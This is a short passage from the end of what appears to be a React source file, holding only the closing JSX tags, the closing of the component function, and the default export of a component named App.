    </div>
  );
}

export default App;
